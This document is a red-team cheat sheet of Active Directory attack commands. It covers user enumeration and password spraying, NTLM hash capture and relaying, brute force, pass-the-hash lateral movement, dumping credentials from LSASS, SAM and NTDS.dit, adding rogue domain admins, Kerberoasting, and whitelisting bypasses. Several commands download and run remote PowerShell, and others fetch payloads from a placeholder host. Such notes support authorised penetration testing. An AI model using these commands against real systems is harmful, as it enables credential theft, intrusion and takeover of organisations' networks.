# Red-Team and Infrastructure Assessments

### O365 bruting

`python3 office365userenum.py -u test.txt -v -o output.txt --password 'Password1'
### Cert search
https://crt.sh
`%.blah.com`
### search categorized expired domain
`python3 ./domainhunter.py -r 1000`

### Metadata
`PS C:\> Invoke-PowerMeta -TargetDomain targetdomain.com`

## Domain User Enumeration

### MailSniper

#### Usernameharvest
`Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt`
#### Domainnameharvest
`Invoke-DomainHarvestOWA -ExchHostname mail.domain.com` 
#### OWA Spray
`Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt`

### Grab employee names from Linkedin

`theharvester -d blah.com -l 1000 -b linkedin`

### Extract Linkedin details from snov.io

Regex to extract emails

`grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"`

### Extract from burp 

`cat linkedin.txt | tr , '\n' | sed 's/\”//g' | awk '/"title":{"textDirection":"FIRST_STRONG"/{getline; print}'`

### Change format to b.lah

`awk '=FS tolower(substr(,1,1)$NF)' linkedin-user-list.txt | awk '{ print   }'`

`awk '{print $0,tolower(substr($1,1,1)$NF)}' names.txt`

### Check usernames against AD:

Handy if you have generated a list from linkedin or a list of usernames.

`nmap -p 88 1.1.1.1 --script krb5-enum-users --script-args krb5-enum-users.realm="DOMAIN"`

username list is located at `/usr/local/share/nmap/nselib/data/usernames.lst` in Kali

### Null sessions

Still works on infra that was upgraded from 2k, 2k3.

`net use \\IP_ADDRESS\ipc$ "" /user:""`

Use enum4linux, enum or Dumpsec following the null session setup.

## Network Attacks 

### Responder

Grab NetNTLM hashes off the network

#### Without wpad:

`responder -I eth0`

#### With wpad:

`responder -I eth0 --wpad -b -f -F`

#### Filter logs from logs folder and remove machine accounts:

`sort -m *.txt | uniq -d | awk '!/\$/'`

#### Cracking with John:

`john SMB-NTLMv2-Client-172.20.22.217.txt --wordlist=/root/passwords.txt`

Use hashcat on a more powerful box. This is only for easy wins.

#### NTLM Relaying 

`ntlmrelayx.py -tf targets.txt -c <insert Empire Powershell launcher>`
  
### MITM6

`python mitm6.py -d blah.local`

#### Capture hashes

`impacket-smbserver hiya /tmp/ -smb2support`

## Bruteforce domain passwords
### Common Passwords

$Company1
$Season$Year
Password1
Password!
Welcome1
Welcome!
Welcome@123
P@55word
P@55w0rd
$month$year

### Using hydra

`hydra -L users.txt -p Password1 -m 'D' 172.20.11.55 smbnt -V`

### Bruteforce using net use

`@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\DOMAINCONTROLLER\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\DOMAINCONTROLLER\IPC$ > NUL`

### Domain joined machine

`Invoke-DomainPasswordSpray -Password Spring2017`

## Non-domain joined testing

When you have an initial set of compromised creds run these from a Virtual Machine to place foothold on network as domain user.

### Shell with domain user privileges
`C:\runas.exe /netonly /user:BLAHDOMAIN\blahuser cmd.exe`

Make sure you use the FQDN of the domain and set the reg key as below.

### check dc: 
`nltest /dsgetdc:domain.local`

To change DC via registry to point at domain being tested:

HKEY_LOCAL_MACHINE
SYSTEM
CurrentControlSet
Services
Netlogon
Parameters
“SiteName“ > DC1.domain.com

### Create session for use with dumpsec
`net use \\10.0.0.1\ipc$ /user:domain.local\username password`

### Quick User lists and password policy enum

`net users /domain`

`net group /domain "Domain Admins"`

`net accounts /domain`

Note that the above commands do not work with runas. Below PowerView functions will work with runas.

### Powerview:

`. .\PowerView.ps1`

`Get-UserProperty -Properties samaccountname`

`Get-NetGroupMember`

`Get-DomainPolicy`

Search shares and files using Invoke-FileFinder and Invoke-ShareFinder

## Domain Analysis

### BloodHound

Run locally on non-domain joined machine (remember to add target domain to registry):

``..\BloodHound.ps1``

``Invoke-BloodHound``

### SharpHound

`SharpHound.exe --CollectionMethod All`

### Run from remote shell

Useful when you have a remote shell.

`powershell Set-ExecutionPolicy RemoteSigned`

`powershell -command "& { . C:\BloodHound.ps1; Invoke-BloodHound }"`

### Run from web server or over Internet:

Use this when you cannot copy BloodHound.ps1 over to target.

`powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1'); Invoke-BloodHound"`

### Run using Sharppick - AMSI bypass

SharpPick.exe -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound"

### Goddi (fast dump all domain info)

`.\godditest-windows-amd64.exe -username=testuser -password="testpass!" -domain="test.local" -dc="dc.test.local" -unsafe`

### ADRecon (More detailed - Good for AD Auditing)

https://github.com/sense-of-security/ADRecon

### Share and file finder
`Invoke-ShareFinder -CheckShareAccess -Verbose -Threads 20 | 
Out-File -Encoding Ascii interesting-shares.txt`

`Invoke-FileFinder -ShareList .\interesting-shares.txt -Verbose -Threads 
20 -OutFile juicy_files.csv`

## Compromise and Lateral Movement

### Crackmapexec

`crackmapexec smb 172.16.110.0/24`

`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 -x 'ipconfig'`

`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --pass-pol`

`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 -M mimikatz`

`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --sam`

`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --lsa`

### Winexe to boxes (not opsec safe) - service is run. No cleanup.

`pth-winexe //10.0.0.1 -U DOMAINBLAH/blahuser%blahpassword cmd`

`pth-winexe //10.0.0.1 -U DOMAINBLAH/blahuser%hash cmd`

### Impacket psexec.py to boxes (not opsec safe) - does cleanup after but leaves logs after installing and running service.

`psexec.py user@IP`

`psexec.py user@IP -hashes ntlm:hash`

### Impacket wmiexec.py (opsec safe - unless WMI logging is enabled)

`wmiexec.py domain/user@IP`

`wmiexec.py domain/user@IP -hashes ntlm:hash`

### Impacket smbclient (probably opsec safe as its just using SMB)

`python smbclient.py domain/blahuser@10.0.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:blah`

## RDP Pass the Hash
Using mimikatz:

`privilege::debug`
`sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"`

If disabled:

`sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe`
`Enter-PSSession -Computer <Target>`
`New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`

## Password dumping

### From Live Kali on a workstation
`samdump2 SYSTEM SAM > hashes.txt`

### Local

`C:\> reg.exe save hklm\sam c:\temp\sam.save`

`C:\> reg.exe save hklm\security c:\temp\security.save`

`C:\> reg.exe save hklm\system c:\temp\system.save`

`secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`

`pwdump system sam`

### In Memory
`C:\> procdump.exe -accepteula -ma lsass.exe c:\lsass.dmp 2>&1`

`C:\> mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit`

### From box

`mimikatz # privilege::debug`
`mimikatz # sekurlsa::logonPasswords full`

### Remote

`impacket-secretsdump Administrator@ip`
`impacket-secretsdump Administrator@ip -hashes ntlm:hash`

### Domain 

To find where NTDS is run the below:

`reg.exe query hklm\system\currentcontrolset\services\ntds\parameters`

### vssadmin

`C:\vssadmin list shadows`

`C:\vssadmin create shadow /for=C:`

`copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit .`

`copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM .`

`copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM .`

`secretsdump.py -system system.save -ntds ntds.dit local -just-dc-ntlm`

`grep -a -F ':::' hashes.txt | grep -av '$:' > finalhashes.txt`

`vssadmin delete shadows /shadow={cd534584-a272-44ab-81e1-ab3f5fbe9b29}`

### ntdsutil

```
C:\>ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\pentest
ifm: quit
ntdsutil: quit
```

`ntdsutil`

`ntdsutil: snapshot`

`ntdsutil: list all`

`ntdsutil: create`

`snapshot: mount 1`

Cleanup snapshots:

`snapshot: list all`

`snapshot: unmount 1`

`snapshot: list all`

`snapshot: delete 1`

## Post Compromise (Not opsec safe)
Add user to local admin and domain admin

### Add Domain Admin
`net user username password /ADD /DOMAIN`

`net group "Domain Admins" username /ADD /DOMAIN`

### Add Local Admin
`net user username password /ADD`

`net localgroup Administrators username /ADD`


### Tasklist scraper to find logged in admins

If powershell not enabled or unable to run BloodHound this script will find admins.

`#!/bin/sh`

`for ip in $(cat ip.txt);do`

`pth-winexe -U Admin%hash //$ip "ipconfig"`

`pth-winexe -U Admin%hash //$ip "tasklist /v"`

`done`

### Kerberoasting

`Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat`

https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1

Invoke-AutoKerberoast

`python autoKirbi2hashcat.py ticketfilefromautoinvokekerberoast`

`IEX (New-Object Net.WebClient).DownloadString('https://github.com/EmpireProject/Empire/raw/master/data/module_source/credentials/Invoke-Kerberoast.ps1'); Invoke-Kerberoast`

### Hashcat Alienware - kerbtgt hash cracking

`sudo apt-get install nvidia-367`

`sudo nvidia-smi`

`reboot`

`sudo hashcat -I`

`hashcat -m 13100 kerb.txt ~/Downloads/realuniq.lst` 

### LAPS - GetLAPSPasswords

https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1

## Priv Esc
### Powerup

`IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks`

## File Transfer

### SMB Server in Kali

`python smbserver.py test /root/tools`

### Python Web Server

`python -m SimpleHTTPServer <port>`

## Domain Fronting

https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/
https://signal.org/blog/doodles-stickers-censorship/
https://www.securityartwork.es/2017/01/24/camouflage-at-encryption-layer-domain-fronting/
https://trac.torproject.org/projects/tor/wiki/doc/meek
http://bryceboe.com/2012/03/12/bypassing-gogos-inflight-internet-authentication/

## AWL bypasses

### Powershell without powershell.exe

`SharpPick.exe -d "http://blah/blah.ps1"`

### Squiblytwo 

`wmic.exe os get /format:"http://blah/foo.xsl"`

### Sharpshooter

https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/

`python SharpShooter.py --stageless --dotnetver 2 --payload js --output foo --rawscfile ./output/payload.bin --smuggle --template mcafee --com xslremote --awlurl http://blah/foo.xsl`

### cypher queries

user to which box the user has localadmin

`MATCH (u:User)-[r:MemberOf|:AdminTo*1..]->(c:Computer) return u.name, collect(c.name)`
